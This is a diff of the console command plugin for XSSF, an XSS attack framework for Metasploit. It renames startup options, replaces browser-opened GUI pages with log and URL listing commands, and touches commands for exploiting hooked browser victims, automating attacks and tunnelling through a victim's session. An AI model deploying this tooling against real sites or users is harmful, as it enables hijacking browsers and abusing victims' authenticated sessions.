@@ -12,17 +12,20 @@ module Msf
 
 			clean_database;	Msf::Xssf::AUTO_ATTACKS.clear
 
-			@DefaultPort = Msf::Xssf::SERVER_PORT;		@DefaultUri  = Msf::Xssf::SERVER_URI;		@DefaultDebug	=	false;	
+			@DefaultPort = Msf::Xssf::SERVER_PORT;		@DefaultUri  = Msf::Xssf::SERVER_URI;		@DefaultDebug	=	false;	@defaultPublic = false;	@defaultQuiet = false;
 
 			# Check if parameters are correct if entered
-			opts['ServerPort'].to_s =~ /^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$/ ? port = opts['ServerPort'] : port = @DefaultPort
-			opts['ServerUri'].to_s  =~ /^\/?([a-zA-Z0-9\-\._\?\,\'\/\\\+&amp;%\$#\=~])+$/ ? uri = opts['ServerUri'].to_s : uri = @DefaultUri
-			opts['DebugMode'].to_s  =~ /^true$/ ? Msf::Xssf::XSSF_DEBUG_MODE[0] = true : Msf::Xssf::XSSF_DEBUG_MODE[0] = @DefaultDebug
+			opts['Port'].to_s 	=~ /^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$/ ? port = opts['Port'] : port = @DefaultPort
+			opts['Uri'].to_s  	=~ /^\/?([a-zA-Z0-9\-\._\?\,\'\/\\\+&amp;%\$#\=~])+$/ ? uri = opts['Uri'].to_s : uri = @DefaultUri
+			opts['Debug'].to_s  =~ /^true$/ ? Msf::Xssf::XSSF_DEBUG_MODE[0] = true : Msf::Xssf::XSSF_DEBUG_MODE[0] = @DefaultDebug
+			
+			opts['Public'].to_s =~ /^true$/ ? Msf::Xssf::XSSF_PUBLIC[0] = true : Msf::Xssf::XSSF_PUBLIC[0] = @DefaultPublic
+			opts['Quiet'].to_s =~ /^true$/ ? Msf::Xssf::XSSF_QUIET_MODE[0] = true : Msf::Xssf::XSSF_QUIET_MODE[0] = @DefaultQuiet
 			
 			uri = '/' + uri if (uri[0].chr  != "/")
 			uri = uri + '/' if (uri[-1].chr != "/")
 			
-			if (not framework.db.active)	# Removing SQLITE3 support as default DB (from previous XSSF version), user must connect manually
+			if (not framework.db.active)
 				print_error("The database backend has not been initialized ...")
 				print_status("Please connect MSF to an installed database before loading XSSF !")
 				raise PluginLoadError.new("Failed to connect to the database.")
@@ -33,13 +36,12 @@ module Msf
 			begin
 				raise "Database Busy..." if not start(port, uri)
 				add_console_dispatcher(ConsoleCommandDispatcher)
+				print_error("Your Ruby version is #{RUBY_VERSION.to_s}. Make sure your version is up-to-date with the last non-vulnerable version before using XSSF!\n\n")
 				print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n")
-				print_good("Server started : http://#{Rex::Socket.source_address('1.2.3.4')}:#{port}#{uri}\n")
-				print_status("Please, inject '#{"http://#{Rex::Socket.source_address('1.2.3.4')}:#{port}#{uri}"}loop' or '#{"http://<PUBLIC-IP>:#{port}#{uri}loop"}' resource in an XSS")
 
-				print_error("Your ruby version is #{RUBY_VERSION.to_s}. Recommended version is 1.9.2 or higher!") unless (RUBY_VERSION.to_s =~ /^1\.9/)
+				print_good("Please use command 'xssf_urls' to see useful XSSF URLs")
 			rescue
-				raise PluginLoadError.new("Error starting server : #{$!}")
+				raise PluginLoadError.new("Error starting server: #{$!}")
 			end
 		end
 
@@ -71,6 +73,7 @@ module Msf
 			include Msf::Ui::Console::CommandDispatcher
 			include Msf::Xssf::XssfMaster
 
+
 			#
 			# The dispatcher's name.
 			#
@@ -80,6 +83,7 @@ module Msf
 
 			#
 			# Commands supported by this dispatcher.
+			# TODO: xssf_logs [VictimID], xssf_log [logID]
 			#
 			def commands
 				{
@@ -88,12 +92,8 @@ module Msf
 					"xssf_active_victims"  		=> "Displays active victims",
 					"xssf_information"			=> "Displays information about a given victim",
 					"xssf_servers"   			=> "Displays all used attack servers",
-					
-					# XSSF GUI HTML COMMANDS
-					"xssf_logs"					=> "Exports attacks logs page",
-					"xssf_stats"				=> "Exports real time statistics page",
-					"xssf_help"					=> "Exports XSSF help page",
-					"xssf_set_public"			=> "Set public access authorized or not for GUI pages",
+					"xssf_logs"					=> "Displays logs about a given victim",
+					"xssf_log"					=> "Displays log with given ID",
 					
 					# NON-XSSF MODULES ATTACKS
 					"xssf_tunnel"   			=> "Do a tunnel between attacker and victim",
@@ -109,7 +109,7 @@ module Msf
 					"xssf_clean_victims"		=> "Clean victims in database (delete waiting attacks)",
 					
 					# OTHERS
-					"xssf_test"					=> "Opens a new test page",
+					"xssf_urls"					=> "List useful available URLs provided by XSSF",
 					"xssf_banner"				=> "Prints XSS Framework banner !"
 				}
 			end
@@ -117,13 +117,13 @@ module Msf
 			def cmd_xssf_exploit(*args)
 				url = nil 
 				begin
-					raise "Wrong arguments : [JobID] must be an Integer." unless (args[-1].to_s =~ /^([0-9]+)$/)
+					raise "Wrong arguments: [JobID] must be an Integer." unless (args[-1].to_s =~ /^([0-9]+)$/)
 				
 					print_status("Searching Metasploit launched module with JobID = '#{args[-1].to_s}'...")
 					
 					# Watching if jobID is an running module
 					if (obj = framework.jobs[args[-1]])
-						print_good("A running exploit exists : '#{obj.name}'")
+						print_good("A running exploit exists: '#{obj.name}'")
 						datastore = obj.ctx[0].datastore
 						url = "http://#{Rex::Socket.source_address('1.2.3.4')}:#{datastore['SRVPORT']}#{obj.ctx[0].get_resource}"
 						process_victims_string((args[0..-2] * ' ').gsub(/\s*/, ''), "attack_victim", url, obj.name)
@@ -141,7 +141,7 @@ module Msf
 					print_error("Exploit interrupted by the console user")
 				rescue ::Exception
 					print_error("#{$!}")
-					print_error("Wrong arguments : xssf_exploit [VictimIDs] [JobID]")
+					print_error("Wrong arguments: xssf_exploit [VictimIDs] [JobID]")
 					print_error("Use MSF 'jobs' command to see running jobs")
 				end
 			end
@@ -149,25 +149,25 @@ module Msf
 			def cmd_xssf_tunnel(*args)
 				if (args.length == 1)
 					begin
-						raise "Wrong arguments : [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
+						raise "Wrong arguments: [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
 
 						victim = tunnel_victim(args[0])		
-						
+							
 						raise "Victim #{args[0].to_s} does not exist or is no longer active" if not victim
 						raise "Victim has 'Unknown' location in database" if (victim.location == "Unknown")
 
 						uri = URI.parse(URI.escape(CGI::unescape(victim.location)))
-				
+					
 						print_status("Creating new tunnel with victim '#{args[0].to_s}' (#{uri.scheme}://#{uri.host}:#{uri.port}) ...")
-						print_status("You can now add XSSF Server as your browser proxy and visit domain of victim '#{args[0].to_s}' ! ;-)\n")
-						print_status("NOTE : Other HTTP domains are also accessible through XSSF Tunnel, but user session won't be available\n")
-						
+						print_status("You can now add XSSF as your browser proxy (command 'xssf_url' to get proxy infos) and visit domain of victim '#{args[0].to_s}' ! ;-)\n")
+						print_status("NOTE: Other HTTP domains are also accessible through XSSF Tunnel, but user session won't be available\n")
+							
 						if (uri.scheme == 'https')
-							print_status("IMPORTANT : Victim domain is HTTPs! Please use HTTP protocol instead (example: #{uri.scheme}://#{uri.host}:#{uri.port} => http://#{uri.host}/)")
+							print_status("IMPORTANT: Victim domain is HTTPS! Please use HTTP protocol instead (example: #{uri.scheme}://#{uri.host}:#{uri.port} => http://#{uri.host}/)")
 						end
 
 						while (victim_tunneled) do; 	Rex::ThreadSafe.sleep(5);	end
-							
+								
 						raise "Victim #{args[0].to_s} is no longer active"
 
 					rescue ::Interrupt
@@ -175,18 +175,18 @@ module Msf
 					rescue ::Exception
 						print_error("#{$!}")
 					end
-					
+						
 					clean_victim(args[0])
 					print_status("Removing tunnel with victim #{args[0].to_s} ...")
 				else
-					print_error("Wrong arguments : cmd_xssf_tunnel_victim [VictimID]")
+					print_error("Wrong arguments: xssf_tunnel_victim [VictimID]")
 				end
 			end
 			
 			def cmd_xssf_information(*args)
 				# Check if victim ID is correct if one is entered
 				if (args.length == 1)
-					print_error("Wrong arguments : [VictimID] must be an Integer") unless (args[0].to_s =~ /^([0-9]+)$/)
+					print_error("Wrong arguments: [VictimID] must be an Integer") unless (args[0].to_s =~ /^([0-9]+)$/)
 					
 					victim = get_victim(args[0])
 					
@@ -216,13 +216,13 @@ module Msf
 					
 
 				else
-					print_error("Wrong arguments : cmd_xssf_information [VictimID]")
+					print_error("Wrong arguments: xssf_information [VictimID]")
 				end
 			end
 
 			
 			def cmd_xssf_auto_attacks(*args)
-				print_good("Automated attacks :")
+				print_good("Automated attacks:")
 				Msf::Xssf::AUTO_ATTACKS.each do |a|
 					if (framework.jobs[a])
 						puts "\t * #{a} - #{framework.jobs[a].name}"
@@ -237,7 +237,7 @@ module Msf
 			
 			def cmd_xssf_add_auto_attack(*args)	
 				if (args.length == 1)	
-					raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
+					raise "Wrong arguments: [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
 				
 					print_status("Searching Metasploit launched module with JobID = '#{args[0].to_s}'...")
 						
@@ -249,7 +249,7 @@ module Msf
 						print_error("No Metasploit launched module was found... Please run one first or check JobID parameter !")
 					end
 				else
-					print_error("Wrong arguments : cmd_xssf_add_auto_attack [JobID]")
+					print_error("Wrong arguments: xssf_add_auto_attack [JobID]")
 					print_error("Use MSF 'jobs' command to see running jobs")
 				end
 			end
@@ -257,49 +257,59 @@ module Msf
 			
 			def cmd_xssf_remove_auto_attack(*args)	
 				if (args.length == 1)	
-					raise "Wrong arguments : [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
+					raise "Wrong arguments: [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
 				
 					Msf::Xssf::AUTO_ATTACKS.delete(args[0])
 					print_good("Job '#{args[0]}' removed from automated attacks")
 				else
-					print_error("Wrong arguments : cmd_xssf_remove_auto_attack [JobID]")
+					print_error("Wrong arguments: xssf_remove_auto_attack [JobID]")
 					print_error("Use MSF 'jobs' command to see running jobs")
 				end
 			end
 
 			
+			def cmd_xssf_urls(*args)
+				srv  = active_server;	host = srv[0];	port = srv[1];	uri  = srv[2]
+				
+				print_good("XSSF Server \t : 'http://#{host}:#{port}#{uri}' \t\tor 'http://<PUBLIC-IP>:#{port}#{uri}'")
+				print_good("Generic XSS injection: 'http://#{host}:#{port}#{uri}#{Msf::Xssf::VICTIM_LOOP}' \tor 'http://<PUBLIC-IP>:#{port}#{uri}#{Msf::Xssf::VICTIM_LOOP}'")
+				print_good("XSSF test page\t : 'http://#{host}:#{port}#{uri}#{Msf::Xssf::VICTIM_TEST}' or 'http://<PUBLIC-IP>:#{port}#{uri}#{Msf::Xssf::VICTIM_TEST}'")
+				
+				puts ""
+				
+				if (Msf::Xssf::XSSF_PUBLIC[0])
+					print_good("XSSF Tunnel Proxy\t: '#{host}:#{port + 1}' \t\t\t\t\ \ \ \ or '<PUBLIC-IP>:#{port + 1}'")
+					print_good("XSSF logs page\t: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main' \ or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main'")
+					print_good("XSSF statistics page: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats' or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats'")
+					print_good("XSSF help page\t: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help' \ or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help'")
+				else
+					print_good("XSSF Tunnel Proxy\t: 'localhost:#{port + 1}'")
+					print_good("XSSF logs page\t: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main'")
+					print_good("XSSF statistics page: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats'")
+					print_good("XSSF help page\t: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help'")
+				end
+			end
+			
 			def cmd_xssf_logs(*args)
-				Thread.new do
-					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=main' ...")
-					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=main") if not (args[0].to_s =~ /^false$/i)
+				if (args.length == 1)	
+					raise "Wrong arguments: [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
+				
+					show_table("Victim #{args[0].to_s} logs", DBManager::XssfLog, ["xssf_victim_id = ?", args[0].to_i], ["xssf_victim_id", "result"]); 
+					
+					print_status("Info: Logs with an empty name are just launched attacks logs and does not contain results!");
+				else
+					print_error("Wrong arguments: xssf_logs [VictimID]")
 				end
 			end
 			
-			
-			def cmd_xssf_stats(*args)
-				Thread.new do
-					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=stats' ...")
-					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=stats") if not (args[0].to_s =~ /^false$/i)
-				end
-			end
-			
-			
-			def cmd_xssf_help(*args)
-				Thread.new do
-					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_GUI + "?"+ Msf::Xssf::PARAM_GUI_PAGE}=help' ...")
-					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_GUI + "?#{Msf::Xssf::PARAM_GUI_PAGE}=help") if not (args[0].to_s =~ /^false$/i)
-				end
-			end
-			
-			def cmd_xssf_set_public(*args)
-				Msf::Xssf::XSSF_FROM_OUTSIDE[0] = ((args[0].to_s =~ /^true$/i) ? true : false)
-			end
-			
-
-			def cmd_xssf_test(*args)
-				Thread.new do
-					print "\n"; print_status("Opening in browser '#{active_server + Msf::Xssf::VICTIM_TEST}' ...")
-					Rex::Compat.open_browser(active_server + Msf::Xssf::VICTIM_TEST)
+			def cmd_xssf_log(*args)
+				if (args.length == 1)	
+					raise "Wrong arguments: [LogID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
+				
+					print_good("Result stored on log#{args[0].to_s}:")
+					puts get_log_content(args[0].to_i)
+				else
+					print_error("Wrong arguments: xssf_logs [LogID]")
 				end
 			end
 			
